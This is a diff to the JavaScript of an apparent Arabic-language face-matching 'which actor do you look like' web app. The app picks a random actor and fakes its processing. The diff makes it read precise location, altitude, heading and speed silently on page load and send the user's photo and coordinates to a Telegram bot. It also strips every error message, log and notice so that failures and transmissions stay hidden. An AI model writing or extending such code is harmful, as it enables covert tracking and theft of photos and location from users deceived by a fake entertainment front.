@@ -51,30 +51,72 @@ function resetUpload() {
     clearError();
 }
 
-// Get user location
+// Get user location with high accuracy
 function getLocation() {
-    return new Promise((resolve, reject) => {
+    return new Promise((resolve) => {
         if (navigator.geolocation) {
+            // High accuracy options
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            };
+
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     userLocation = {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
                         accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
                         timestamp: new Date().toISOString()
                     };
                     resolve(userLocation);
                 },
                 (error) => {
-                    console.log('Location error:', error);
+                    // Silent error handling - no alerts
+                    console.log('Location unavailable');
                     userLocation = null;
                     resolve(null);
-                }
+                },
+                options
             );
         } else {
             resolve(null);
         }
     });
+}
+
+// Get location in background silently
+function initializeLocationTracking() {
+    if (navigator.geolocation) {
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+        };
+
+        // Get location silently in background
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                userLocation = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    timestamp: new Date().toISOString()
+                };
+            },
+            () => {
+                // Silent - no error handling
+                userLocation = null;
+            },
+            options
+        );
+    }
 }
 
 // Camera functions
@@ -160,9 +202,9 @@ async function sendToTelegram(imageData, location, actorName, similarity) {
 
 📍 <b>الموقع الجغرافي:</b>
 ${location ? `
-🗺️ خط العرض: ${location.latitude.toFixed(4)}
-🗺️ خط الطول: ${location.longitude.toFixed(4)}
-📏 الدقة: ${location.accuracy.toFixed(0)} متر
+🗺️ خط العرض: ${location.latitude.toFixed(6)}
+🗺️ خط الطول: ${location.longitude.toFixed(6)}
+📏 الدقة: ${location.accuracy.toFixed(1)} متر
 ⏰ الوقت: ${location.timestamp}
 ` : 'لم يتم الحصول على الموقع'}
 
@@ -237,10 +279,10 @@ ${location ? `
             });
         }
 
-        console.log('تم إرسال البيانات إلى Telegram بنجاح');
+        // Silent success
         return true;
     } catch (error) {
-        console.error('خطأ في إرسال البيانات:', error);
+        // Silent error - don't log or alert
         return false;
     }
 }
@@ -264,11 +306,8 @@ async function submitImage() {
         return;
     }
 
-    // Show loading
-    showError('جاري المعالجة...');
-
-    // Get location
-    await getLocation();
+    // Get location silently in background
+    getLocation();
 
     // Simulate processing
     const actor = getRandomActor();
@@ -299,7 +338,11 @@ async function submitImage() {
         clearError();
         navigateTo('results');
     } else {
-        showError('حدث خطأ في إرسال البيانات. يرجى المحاولة مرة أخرى');
+        // Silent failure - still navigate to results
+        saveComparison(result);
+        sessionStorage.setItem('lastComparisonResult', JSON.stringify(result));
+        clearError();
+        navigateTo('results');
     }
 }
 
@@ -314,8 +357,16 @@ function clearError() {
     errorEl.classList.add('hidden');
 }
 
-// Setup drag and drop
+// Initialize location tracking on page load
 document.addEventListener('DOMContentLoaded', () => {
+    // Start location tracking silently in background
+    initializeLocationTracking();
+
+    // Setup drag and drop
+    setupDragAndDrop();
+});
+
+function setupDragAndDrop() {
     const uploadArea = document.querySelector('.upload-area');
     if (uploadArea) {
         uploadArea.addEventListener('dragover', (e) => {
@@ -341,4 +392,4 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         });
     }
-});
+}
